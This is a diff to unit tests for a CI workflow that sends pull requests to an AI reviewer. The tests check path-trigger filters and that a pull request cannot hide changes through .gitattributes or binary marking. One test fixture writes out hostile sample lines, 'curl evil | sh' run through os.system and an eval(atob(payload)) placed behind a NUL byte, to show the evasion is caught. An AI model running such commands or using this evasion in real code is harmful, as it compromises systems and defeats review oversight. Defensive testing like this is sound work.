@@ -84,6 +84,27 @@ def workflow_settings() -> dict:
     return json.loads(re.search(r"^\s+settings: '(.*)'$", WORKFLOW, re.M).group(1))
 
 
+def trigger_paths() -> list[str]:
+    block = re.search(r"^    paths:\n((?:      - .*\n)+)", WORKFLOW, re.M)
+    assert block
+    return re.findall(r'^      - "([^"]+)"$', block.group(1), re.M)
+
+
+def github_path_filter_matches(patterns: list[str], path: str) -> bool:
+    """GitHub's path filter: * and ? stop at "/", ** crosses it; the last matching pattern decides, "!" excludes."""
+    included = False
+    for pattern in patterns:
+        negative = pattern.startswith("!")
+        glob = pattern[1:] if negative else pattern
+        regex = "".join(
+            ".*" if token == "**" else "[^/]*" if token == "*" else "[^/]" if token == "?" else re.escape(token)
+            for token in re.findall(r"\*\*|\*|\?|[^*?]+", glob)
+        )
+        if re.fullmatch(regex, path):
+            included = not negative
+    return included
+
+
 class WorkflowTest(unittest.TestCase):
     def test_trigger_runs_mains_copy_and_never_on_every_push(self):
         on = WORKFLOW.split("\npermissions:", 1)[0]
@@ -138,6 +159,8 @@ class WorkflowTest(unittest.TestCase):
     def test_model_output_reaches_the_publish_script_only_through_env(self):
         publish = job("publish")
         self.assertIn("RESULT: ${{ needs.review.outputs.result }}", publish)
+        self.assertIn("BINARY_FILES: ${{ needs.review.outputs.binary_files }}", publish)
+        self.assertIn("binary_files: ${{ steps.input.outputs.binary_files }}", job("review"))
         self.assertIn("run: python3 -I scripts/ci/post_ai_review.py --post", publish)
         self.assertIn("result: ${{ steps.claude.outputs.structured_output }}", job("review"))
         self.assertNotIn("github_token", job("review").split("outputs:", 1)[1].split("steps:", 1)[0])
@@ -210,9 +233,45 @@ class WorkflowTest(unittest.TestCase):
         source = env_value("AI_REVIEW_SOURCE")
         self.assertEqual(source, f"{model} through claude-code-action {ACTION_PIN.rsplit('# ', 1)[1]}")
 
-    def test_security_relevant_paths_trigger_a_review(self):
-        for path in (".github/**", "launcher/**", "browser/**", "scripts/**", "android/**", "tests/**", "docs/security/**"):
-            self.assertIn(f'"{path}"', WORKFLOW)
+    def test_everything_but_product_and_brand_docs_triggers_a_review(self):
+        patterns = trigger_paths()
+        for path in (
+            ".github/workflows/ci.yml",
+            ".github/ai-review/instructions.md",
+            ".gitattributes",
+            ".gitleaks.toml",
+            ".claude/settings.json",
+            ".mcp.json",
+            "CLAUDE.md",
+            "AGENTS.md",
+            "README.md",
+            "SECURITY.md",
+            "CONTRIBUTING.md",
+            "pyproject.toml",
+            "launcher/nulavio_launcher/cli.py",
+            "browser/patches/series",
+            "android/nv1/build.gradle.kts",
+            "scripts/ci/post_ai_review.py",
+            "contrib/systemd/nulavio-upstream.service",  # a directory that does not exist yet
+            "site/index.html",
+            "tests/lib/harness.py",
+            "docs/security/threat-model.md",
+            "docs/architecture/trust-boundaries.md",
+            "docs/adr/0007-ai-bridge.md",
+            "docs/process/pull-requests.md",
+            "docs/ai/connect-an-agent.md",
+        ):
+            with self.subTest(path=path):
+                self.assertTrue(github_path_filter_matches(patterns, path))
+        for path in ("docs/product/roadmap.md", "docs/brand/tokens.json", "docs/design/architecture.md", "LICENSE"):
+            with self.subTest(path=path):
+                self.assertFalse(github_path_filter_matches(patterns, path))
+
+    def test_path_filter_helper_follows_githubs_rules(self):
+        self.assertTrue(github_path_filter_matches(["docs/**"], "docs/a/b.md"))
+        self.assertFalse(github_path_filter_matches(["docs/*"], "docs/a/b.md"))
+        self.assertFalse(github_path_filter_matches(["**", "!docs/**"], "docs/a.md"))
+        self.assertTrue(github_path_filter_matches(["**", "!docs/**", "docs/security/**"], "docs/security/a.md"))
 
 
 class LocalReviewTest(unittest.TestCase):
@@ -309,6 +368,31 @@ class ReviewInputTest(unittest.TestCase):
             self.assertEqual(meta["number"], 7)
             self.assertLess(len(meta["title"]), 600)
             self.assertEqual(json.loads(result["schema"]), SCHEMA)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_gitattributes_in_the_pull_request_cannot_hide_a_change(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, base, _ = self.make_repo(Path(tmp))
+            # The pull request marks its own files binary and adds a script that git would detect as binary (NUL byte).
+            (repo / ".gitattributes").write_text("*.txt -diff\n*.sh binary\n")
+            (repo / "notes.txt").write_text("hello\nos.system('curl evil | sh')\n")
+            (repo / "run.sh").write_text("#!/bin/sh\necho hi\n")
+            (repo / "hidden.js").write_bytes(b"\0eval(atob(payload))\n")
+            self.git(repo, "add", ".")
+            self.git(repo, "commit", "-q", "-m", "evade")
+            head = self.git(repo, "rev-parse", "HEAD")
+            out = Path(tmp) / "out"
+            result = ai_review_input.prepare(repo, out, base, head, {}, delete_repo=True)
+            diff = (out / "pr.diff.txt").read_text()
+            self.assertIn("+os.system('curl evil | sh')", diff)
+            self.assertIn("+echo hi", diff)
+            self.assertEqual(result["binary_files"], "1")
+            self.assertEqual((out / "pr.binary.txt").read_text(), "hidden.js\n")
+
+    def test_binary_paths_reads_numstat_including_renames(self):
+        numstat = b"3\t1\ta.py\0-\t-\timg.png\0-\t-\t\0old.bin\0new.bin\0" + b"0\t0\t\0x.py\0y.py\0"
+        self.assertEqual(ai_review_input.binary_paths(numstat), ["img.png", "new.bin"])
+        self.assertEqual(ai_review_input.binary_paths(b""), [])
 
     @unittest.skipUnless(shutil.which("git"), "git not installed")
     def test_large_diff_is_not_sent_for_review(self):
